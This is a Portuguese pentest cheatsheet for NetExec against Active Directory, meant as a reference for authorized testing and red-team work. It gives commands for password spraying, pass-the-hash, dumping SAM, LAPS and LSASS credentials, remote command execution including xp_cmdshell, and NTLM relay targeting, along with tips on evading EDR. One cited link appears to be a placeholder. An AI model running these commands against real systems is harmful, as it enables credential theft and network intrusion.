# NetExec (NXC)

NetExec (nxc) é a evolução direta do CrackMapExec, mantendo-se como o "canivete suíço" definitivo para pentest em ambientes Active Directory. Ele é essencial para automação de reconhecimento, movimentação lateral e exfiltração em larga escala.

#### Checklist Conceitual (NetExec)

1. Protocolo Adequado: Selecionar o protocolo correto (`smb`, `winrm`, `ldap`, `mssql`) baseando-se no reconhecimento inicial (portas 445, 5985, 389, 1433).
2. Validação vs. Ataque: Diferenciar o uso para validar credenciais obtidas (Credential Stuffing) vs. ataques de força bruta (Password Spraying).
3. Segurança de Contas: Verificar a política de senhas (`--pass-pol`), dump das politicas com SMB, antes de qualquer ataque de dicionário para evitar bloqueio de contas (Account Lockout).
4. Execução e Evasão: Planejar o método de execução de comando (atexec, smbexec, wmiexec) considerando a presença de EDRs.
5. Modularidade: Utilizar os módulos embutidos (`-M`) para tarefas específicas (dump de LAPS, spidering, enumeração de AV).

***

### Cheatsheet: NetExec (nxc) - AD Swiss Army Knife

```json
{
  "comandos": [
    "# 1. Network Mapping & Null Session (Detectar hosts, domínios e assinaturas SMB)",
    "nxc smb 192.168.1.0/24",
    "# 2. Password Spraying (Testar user:pass em toda a rede - CUIDADO com lockout)",
    "nxc mssql 192.168.1.0/24 -u user_list.txt -p 'Password123' --continue-on-success --local-auth",
    "# 3. Pass-the-Hash (Autenticação com Hash NTLM - Formato LM:NT ou apenas NT)",
    "nxc smb 10.10.10.5 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth",
    "# 4. Enumerar Usuários e Grupos (Via RID Brute-force se Null Session permitir)",
    "nxc mssql 10.10.10.5 -u 'guest' -p pass.txt --rid-brute --local-auth",
    "# 5. Dump de Credenciais (SAM e LAPS - Requer Admin)",
    "nxc smb 10.10.10.0/24 -u Admin -p 'Secret' --sam --laps",
    "# 6. Spidering de Compartilhamentos (Buscar arquivos com senhas/configs)",
    "nxc smb 10.10.10.5 -u user -p pass --spider 'pass' --content",
    "# 7. Execução de Comandos (Trocar estratégia se falhar: atexec, smbexec, wmiexec)",
    "nxc smb 10.10.10.5 -u Admin -p pass -x 'whoami' --exec-method smbexec",
    "# 8. Enumeração de MSSQL e Execução (Ativar xp_cmdshell se possível)",
    "nxc mssql 10.10.10.5 -u sa -p 'Password!' --xp-cmdshell 'whoami'",
    "# 9. WinRM (Mais silencioso e estável para execução de comandos que SMB)",
    "nxc winrm 10.10.10.5 -u user -p pass -X 'ipconfig /all'",
    "# 10. Gerar lista para NTLM Relay (Hosts sem SMB Signing)",
    "nxc smb 192.168.1.0/24 --gen-relay-list targets_relay.txt"
  ],
  "workflow": "1. **Reconhecimento Passivo/Ativo:** Escaneie a rede (`nxc smb CIDR`) para identificar hosts Windows, versões de OS e, crucialmente, se o **SMB Signing** está desativado (para Relay).\n2. **Validação de Credenciais:** Ao obter um par de credenciais ou hash, use o nxc para testar a validade em toda a rede (`-u user -p pass`), identificando onde você tem acesso 'Pwn3d!' (Admin).\n3. **Enumeração Pós-Auth:** Com acesso válido (mesmo que low-priv), enumere compartilhamentos (`--shares`), usuários (`--users`) e políticas de senha (`--pass-pol`).\n4. **Movimentação Lateral:** Identifique máquinas onde você é Admin. Extraia credenciais locais (`--sam`, `--lsa`) ou da memória (`-M lsassy` - cuidado com EDR) para pular para o próximo host.\n5. **Exfiltração/Persistência:** Use módulos para buscar dados sensíveis nos shares ou criar usuários de backdoor (somente se autorizado).",
  "taticas_avancadas": [
    "**NTLM Relay Targeting:** Use `--gen-relay-list` para criar automaticamente uma lista de alvos que não exigem assinatura SMB. Alimente essa lista no `ntlmrelayx.py` do Impacket para escalar privilégios sem saber a senha.",
    "**Módulos de Evasão (AMSI/ETW):** Utilize módulos como `-M srum_dump` ou execute comandos via `winrm` (porta 5985) em vez de SMB, pois o tráfego WinRM (SOAP/HTTP) é muitas vezes menos inspecionado que o tráfego RPC/SMB puro.",
    "**BloodHound Integration:** Use a flag `--bloodhound` (com credenciais válidas) para que o NetExec atue como um *ingestor* de dados, coletando informações de sessões e grupos e enviando diretamente para o banco de dados do BloodHound (Neo4j).",
    "**MSSQL Power:** Não subestime o protocolo MSSQL. Use `nxc mssql` para verificar privilégios. Se for `sysadmin`, habilite `xp_cmdshell` para obter RCE com privilégios de serviço (muitas vezes SYSTEM ou conta de serviço privilegiada).",
    "**Kerberos Auth:** Em ambientes monitorados por NTLM, use a flag `-k` para autenticar via Kerberos (requer ticket TGT válido ou credenciais no cache), o que é mais opaco para algumas detecções legadas."
  ],
  "praticas_seguras": [
    "**Verifique a Política de Senhas:** Antes de qualquer *spray*, execute `nxc smb <DC_IP> -u '' -p '' --pass-pol` para ler a política de bloqueio (Lockout Threshold).",
    "**Evite LSASS Dump Direto:** O uso de módulos que dumpam o LSASS (como `lsassy` embutido) é altamente monitorado por EDRs (CrowdStrike, SentinelOne). Prefira dumpar SAM/LSA ou usar tokens se possível.",
    "**Limpeza de Artefatos:** O NetExec tenta limpar seus rastros (serviços criados), mas se a conexão cair, o serviço pode ficar órfão. Verifique manualmente (`sc query`) se serviços com nomes aleatórios permaneceram nos alvos críticos.",
    "**Opsec na Execução:** Prefira `atexec` (Task Scheduler) ou `wmiexec` (WMI) ao invés de `psexec` (que sobe um serviço binário no disco e é facilmente detectado)."
  ],
  "tradeoffs_performance": "O NetExec é **Python-based** e extremamente rápido para varreduras em massa (subnet /16 ou /24). \n\n**Trade-offs:**\n1. **Barulhento:** Por padrão, ele gera muitos logs de Event ID 4624 (Logon) e 7045 (Service Installation) quando usado para execução de comandos.\n2. **Assinaturas:** Binários padrões usados para injeção podem ser assinados por AVs. \n3. **Dependência de Protocolo:** Se o SMB (445) estiver bloqueado, a ferramenta perde 80% da utilidade (embora WinRM e SSH sejam opções).\n\n**Quando Usar:** Ideal para *Large Scale Recon*, *Password Spraying* e validação inicial. Para execução furtiva em Red Team, prefira ferramentas C2 (Cobalt Strike, Havoc) ou Impacket manual via Proxy.",
  "fontes_referencia": [
    {
      "titulo": "NetExec Official Wiki (Documentation)",
      "url": "https://www.netexec.wiki/"
    },
    {
      "titulo": "HackTricks - CrackMapExec/NetExec SMB Pentesting",
      "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/crackmapexec"
    },
    {
      "titulo": "Black Hills InfoSec - Password Spraying with CME/NetExec",
      "url": "https://www.blackhillsinfosec.com/password-spraying-with-crackmapexec/"
    },
    {
      "titulo": "POV: Moving from CME to NetExec (Pennyw0rth)",
      "url": "https://twitter.com/Pennyw0rth/status/1705270000000000000"
    }
  ]
}
```
